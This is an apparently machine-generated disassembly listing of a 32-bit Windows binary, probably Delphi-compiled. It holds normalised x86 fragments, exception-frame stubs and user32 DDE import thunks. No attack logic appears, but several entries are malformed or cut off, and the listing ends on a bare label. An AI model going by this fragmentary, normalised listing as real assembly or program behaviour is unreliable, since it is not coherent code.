pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478166
jmp sub_403a98
sub_47816d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478197
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_478190
jmp sub_403a98
sub_478197
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_478266
jmp sub_403a98
sub_47826d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4783a8
jmp sub_403a98
sub_4783af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478437
jmp sub_403a98
sub_47843e
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478513
jmp sub_403a98
sub_47851a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478549
jmp sub_403a98
sub_478550
pop ebp
retn
sub_478554
sub [ rw-data ] 0x1
retn
sub_47887c
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_478890
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_4788a0
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4788b4
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_4788ed
jmp sub_403a98
sub_4788f4
pop ebp
retn
sub_4788f8
sub [ rw-data ] 0x1
retn
sub_4789e4
retn
sub_4789e8
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_478a1c
retn
sub_478a20
retn
sub_478a49
jmp sub_403a98
sub_478a50
pop ebp
retn
sub_478a54
sub [ rw-data ] 0x1
retn
sub_478bc4
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_404118
pop ebx
retn
sub_478d57
jmp sub_403a98
sub_478d5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478f26
jmp sub_403a98
sub_478f2d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478fab
jmp sub_403a98
sub_478fb2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478fb8
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_479019
jmp sub_403a98
sub_479020
pop ebp
retn
sub_479024
sub [ rw-data ] 0x1
retn
sub_47952d
jmp sub_403a98
sub_479534
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403910#6
jmp sub_403910
j_sub_403910#2
jmp sub_403910
j_sub_4037e4#6
jmp sub_4037e4
j_sub_4037e4#2
jmp sub_4037e4
sub_479b1f
jmp sub_403a98
sub_479b26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479b71
jmp sub_403a98
sub_479b78
pop ebp
retn
sub_479b7c
sub [ rw-data ] 0x1
retn
sub_479c38
push ebx
mov ebx ecx
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_47b444
mov eax ebx
pop ebx
retn
sub_479c4c
or eax 0xffffffff
retn
sub_479c50
push ebx
mov ebx ecx
push 0x0
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_47bb24
mov eax ebx
pop ebx
retn
sub_479c89
jmp sub_403a98
sub_479c90
pop ebp
retn
sub_479c94
sub [ rw-data ] 0x1
retn
sub_479f1c
jmp sub_403a98
sub_479f23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479fc0
jmp sub_403a98
sub_479fc7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479ffd
jmp sub_403a98
sub_47a004
pop ebp
retn
sub_47a008
sub [ rw-data ] 0x1
retn
sub_47a329
jmp sub_403a98
sub_47a330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a34d
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_47a346
jmp sub_403a98
sub_47a34d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47a525
jmp sub_403a98
sub_47a52c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_47a538
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_47a5b8
mov eax [ eax + 0x68 ]
call sub_475b64
retn
sub_47a634
jmp sub_403a98
sub_47a63b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a6b4
jmp sub_403a98
sub_47a6bb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403910
jmp sub_403910
sub_47a871
jmp sub_403a98
sub_47a878
pop ebp
retn
sub_47a87c
sub [ rw-data ] 0x1
retn
sub_47af38
jmp sub_403a98
sub_47af3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af5c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_47af55
jmp sub_403a98
sub_47af5c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_47b07c
jmp sub_403a98
sub_47b09e
jmp sub_403a98
sub_47b0a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47b180
jmp sub_403a98
sub_47b187
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b338
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_47b3d1
jmp sub_403a98
sub_47b3d8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b436
jmp sub_403a98
sub_47b43d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b748
jmp sub_403a98
sub_47b74f
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47b97a
jmp sub_403a98
sub_47b981
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47ba0e
jmp sub_403a98
sub_47ba15
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ba94
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_421b4c
sub_47bca5
jmp sub_403a98
sub_47bd24
jmp sub_403a98
sub_47bd2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47bdf9
jmp sub_403a98
sub_47be56
jmp sub_403a98
sub_47be5d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bee4
jmp sub_403a98
sub_47beeb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c036
jmp sub_403a98
sub_47c03d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c05c
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_47c055
jmp sub_403a98
sub_47c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c079
lea eax [ ebp - 0x14 ]
call sub_404118
retn
sub_47c072
jmp sub_403a98
sub_47c079
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47c102
jmp sub_403a98
sub_47c109
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c1c8
mov eax [ eax + 0xb0 ]
call sub_41bc68
retn
sub_47c1d4
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_47c2b2
jmp sub_403a98
sub_47c2b9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c395
jmp sub_403a98
sub_47c39c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c4ee
jmp sub_403a98
sub_47c4f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c51f
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47c518
jmp sub_403a98
sub_47c51f
pop ebx
mov esp ebp
pop ebp
retn
sub_47c530
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
call sub_47af64
pop ecx
pop ebp
retn 0x4
sub_47c548
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_47c554
push ebx
mov ebx eax
mov eax ebx
call sub_41bc68
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_47c63c
jmp sub_403a98
sub_47c643
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c64c
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_47c744
jmp sub_403a98
sub_47c74b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c7ad
jmp sub_403a98
sub_47c7b4
pop ebp
retn
sub_47c7b8
sub [ rw-data ] 0x1
retn
j_sub_4037e4
jmp sub_4037e4
sub_47cb1c
jmp sub_403a98
sub_47cb23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47cb72
jmp sub_403a98
sub_47cb79
pop ebx
pop ecx
pop ebp
retn
sub_47cbe8
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_47cc08
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc8 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_47cc20
mov [ eax + 0xdc ] edx
retn
sub_47cc4d
jmp sub_403a98
sub_47cc54
pop ebp
retn
sub_47cc58
sub [ rw-data ] 0x1
retn
sub_47cc85
jmp sub_403a98
sub_47cc8c
pop ebp
retn
sub_47cc90
sub [ rw-data ] 0x1
retn
sub_47d12e
jmp sub_403a98
sub_47d135
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d23a
jmp sub_403a98
sub_47d241
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d29f
retn
sub_47d2a0
jmp sub_403a98
j_sub_47d29f
jmp sub_47d29f
sub_47d2a7
pop ebp
retn
sub_47d2ac
sub [ rw-data ] 0x1
retn
sub_47d45c
jmp sub_403a98
sub_47d463
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47d59f
jmp sub_403a98
sub_47d5a6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47dabf
jmp sub_403a98
sub_47dac6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47dccc
jmp sub_403a98
sub_47dcd3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47de67
jmp sub_403a98
sub_47de6e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47e099
jmp sub_403a98
sub_47e0a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e472
jmp sub_403a98
sub_47e479
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e73c
jmp sub_403a98
sub_47e743
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_47e7d5
jmp sub_403a98
sub_47e7dc
pop ebp
retn
sub_47e7e0
sub [ rw-data ] 0x1
retn
sub_47ecc4
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ed60
retn
sub_47ed7c
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ed9c
retn
sub_47ee2b
jmp sub_403a98
sub_47ee32
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47ef68
jmp sub_403a98
sub_47ef6f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47efef
jmp sub_403a98
sub_47eff6
pop ebp
retn
sub_47eff8
sub [ rw-data ] 0x1
retn
sub_47f1c8
jmp sub_403a98
sub_47f1cf
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f21c
jmp sub_403a98
sub_47f223
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f24d
jmp sub_403a98
sub_47f254
pop ebp
retn
sub_47f258
sub [ rw-data ] 0x1
retn
sub_47f61b
jmp sub_403a98
sub_47f622
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f821
jmp sub_403a98
sub_47f828
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47f8d5
jmp sub_403a98
sub_47f8dc
pop ebp
retn
sub_47f8e0
sub [ rw-data ] 0x1
retn
sub_47fb79
jmp sub_403a98
sub_47fb80
pop ebp
retn
sub_47fb84
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_47f45c
sub_47fdd6
jmp sub_403a98
sub_47fddd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47fe9e
jmp sub_403a98
sub_47fea5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48008b
jmp sub_403a98
sub_480092
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48016b
jmp sub_403a98
sub_480172
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4803ed
jmp sub_403a98
sub_480422
jmp sub_403a98
sub_480429
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_480459
jmp sub_403a98
sub_480460
pop ebp
retn
sub_480464
sub [ rw-data ] 0x1
retn
sub_4807de
jmp sub_403a98
sub_4807e5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4808b6
jmp sub_403a98
sub_480946
jmp sub_403a98
sub_48094d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_480ba8
jmp sub_403a98
sub_480baf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480bd9
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40413c
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_480bd2
jmp sub_403a98
sub_480bd9
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480e46
jmp sub_403a98
sub_480e4d
pop ebx
mov esp ebp
pop ebp
retn
sub_4810c5
jmp sub_403a98
sub_4810cc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4811c7
jmp [ ecx ]
sub_481398
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_4813a1
jmp sub_403a98
j_sub_481398
jmp sub_481398
sub_4813a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4813cd
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4813c6
jmp sub_403a98
sub_4813cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481405
jmp sub_403a98
sub_48140c
pop ebp
retn
sub_4818bd
jmp sub_403a98
sub_4818c4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_481a1a
jmp sub_403a98
sub_481a21
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_481ab2
jmp sub_403a98
sub_481ab9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_481af5
jmp sub_403a98
sub_481afc
pop ebp
retn
sub_481b00
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_47f45c
sub_481db5
jmp sub_403a98
sub_481dbc
pop ebp
retn
sub_481dc0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_47f45c
sub_482245
jmp sub_403a98
sub_48224c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48239e
jmp sub_403a98
sub_4823a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4823c7
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_40413c
retn
sub_4823c0
jmp sub_403a98
sub_4823c7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482574
jmp sub_403a98
sub_48257b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4825a5
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_48259e
jmp sub_403a98
sub_4825a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482645
jmp sub_403a98
sub_48264c
pop ebp
retn
sub_482891
jmp sub_403a98
sub_482898
pop ebp
retn
sub_48289c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4827ec
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_47eee4
sub_4828f5
jmp sub_403a98
sub_4828fc
pop ebp
retn
sub_482900
sub [ rw-data ] 0x1
retn
sub_48292d
jmp sub_403a98
sub_482934
pop ebp
retn
sub_482938
sub [ rw-data ] 0x1
retn
sub_4833fc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_483518
jmp sub_403a98
sub_48351f
pop ebx
mov esp ebp
pop ebp
retn
sub_483570
xor edx edx
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
retn
sub_48360a
jmp sub_403a98
sub_483611
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4836a1
jmp sub_403a98
sub_4836a8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48374b
jmp sub_403a98
sub_483814
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_478448
retn
sub_483848
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_478448
retn
sub_483873
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_48392a
jmp sub_403a98
sub_483931
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4839a5
jmp sub_403a98
sub_483a60
jmp sub_403a98
sub_483a67
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_483aa0
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_478448
retn
sub_483b60
jmp sub_403a98
sub_483b67
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483cb6
jmp sub_403a98
sub_483cbd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_483d68
push ebx
mov ebx eax
mov eax ebx
call sub_483d94
mov eax ebx
call sub_483d7c
pop ebx
retn
sub_483d7c
push ebx
mov ebx eax
mov eax [ ebx + 0x6c ]
call sub_419994
mov eax [ ebx + 0x34 ]
mov edx [ eax ]
call [ edx + 0x44 ]
pop ebx
retn
sub_484028
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_484038
push esi
mov esi eax
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4843ca
jmp sub_4037e4
sub_484404
jmp sub_403a98
sub_48440b
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4846bc
jmp sub_403a98
sub_4846c3
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4847de
jmp sub_403a98
sub_4847e5
mov esp ebp
pop ebp
retn
sub_484b31
jmp sub_403a98
sub_484b38
pop ebx
mov esp ebp
pop ebp
retn
sub_484cc3
mov eax [ esi + 0x5c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_484cd0
mov edx eax
fld [ edx + 0x50 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
retn
sub_484ce8
xor edx edx
mov [ eax + 0x50 ] edx
mov [ eax + 0x54 ] edx
retn
sub_484cf4
mov eax [ eax + 0x6c ]
call sub_483d44
retn
sub_484d00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x1c ]
call sub_40416c
pop esi
pop ebx
retn
sub_484d18
mov [ eax + 0x60 ] dl
test dl dl
jne r-xdata
mov edx r-xdata
call sub_484cf4
retn
mov edx r-xdata
call sub_484cf4
retn
sub_484db8
jmp sub_403a98
sub_484dbf
pop ebp
retn
sub_485072
jmp sub_403a98
sub_485079
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48509b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_485094
jmp sub_403a98
sub_48509b
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4851d9
jmp sub_403a98
sub_4851e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485202
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40413c
retn
sub_4851fb
jmp sub_403a98
sub_485202
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4853c9
jmp sub_403a98
sub_4853eb
jmp sub_403a98
sub_4853f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48544c
jmp sub_403a98
sub_485453
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_485666
jmp sub_403a98
sub_48566d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485b6b
jmp sub_403a98
sub_485dcf
jmp sub_403a98
sub_485e0c
jmp sub_403a98
sub_485e13
pop ebx
mov esp ebp
pop ebp
retn
sub_485e1b
[ ebx ]
sub_485e7f
jmp [ edx ]
sub_485f2b
jmp [ edi ]
sub_485f5b
[ ecx ]
sub_4860cb
jmp [ eax + eax ]
sub_4860fb
jmp [ esi ]
sub_486222
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_48622d
jmp sub_403a98
j_sub_486222
jmp sub_486222
sub_486234
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_486334
jmp sub_403a98
sub_48633b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_486375
jmp sub_403a98
sub_48637c
pop ebp
retn
sub_486380
sub [ rw-data ] 0x1
retn
sub_48659d
jmp sub_403a98
sub_4865a4
pop ebp
retn
sub_4865a8
sub [ rw-data ] 0x1
retn
sub_486860
jmp sub_403a98
sub_486867
pop ebp
retn
sub_48686c
sub [ rw-data ] 0x1
retn
sub_4871ff
jmp sub_403a98
sub_487206
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_487393
jmp sub_403a98
sub_48739a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4874bc
jmp sub_403a98
sub_4874c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4874e8
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4874e1
jmp sub_403a98
sub_4874e8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_487567
jmp sub_403a98
sub_48756e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48758b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_487584
jmp sub_403a98
sub_48758b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_487600
jmp sub_403a98
sub_487607
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_487761
jmp sub_4037e4
sub_487793
jmp sub_403a98
sub_48779a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48789a
jmp sub_403a98
sub_4878dd
jmp sub_403a98
sub_4878e4
mov esp ebp
pop ebp
retn
sub_48793a
jmp sub_403a98
sub_487941
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_487a14
jmp sub_403a98
sub_487a1b
pop ebp
retn
sub_487a20
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ __import_lookup_table_14(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ __import_lookup_table_14(user32:DdeUninitialize) ]
DdeConnect
jmp [ __import_lookup_table_14(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_14(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_14(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_14(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_14(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_14(user32:DdeNameService) ]
DdeClientTransaction
jmp [ DdeClientTransaction@IAT ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ __import_lookup_table_14(user32:DdeAccessData) ]
DdeUnaccessData
jmp [ __import_lookup_table_14(user32:DdeUnaccessData) ]
DdeFreeDataHandle
jmp [ __import_lookup_table_14(user32:DdeFreeDataHandle) ]
DdeGetLastError
jmp [ __import_lookup_table_14(user32:DdeGetLastError) ]
DdeQueryStringA
jmp [ __import_lookup_table_14(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ __import_lookup_table_14(user32:DdeCmpStringHandles) ]
j_sub_403a98#9
jmp sub_403a98
sub_487ae4
pop ebp
retn
sub_487ae8
sub [ rw-data ] 0x1
retn
sub_48859e
jmp sub_403a98
sub_4885a5
pop ebx
mov esp ebp
pop ebp
retn
sub_488870
jmp sub_403a98
sub_488877
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4889f8
jmp sub_403a98
sub_4889ff
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488b3d
jmp sub_403a98
sub_488b44
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_403a98#8
jmp sub_403a98
sub_488c3b
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a98#7
jmp sub_403a98
sub_488d51
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488e03
jmp sub_403a98
sub_488e0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488e10
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_418d74
pop ebx
retn
sub_488e24
mov eax [ eax + 0x40 ]
call sub_418e94
retn
sub_488f6e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_488f7c
jmp sub_403a98
j_sub_488f6e
jmp sub_488f6e
sub_488f83
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489033
jmp sub_403a98
sub_48903a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a98#6
jmp sub_403a98
sub_48910a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48949e
jmp sub_403a98
sub_4894a5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489654
mov [ eax + 0xc6 ] 0x0
retn
sub_489738
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_4896a0
sub_489758
retn
sub_48975c
retn
sub_489760
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_489774
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_489788
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_4897a8
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_48992b
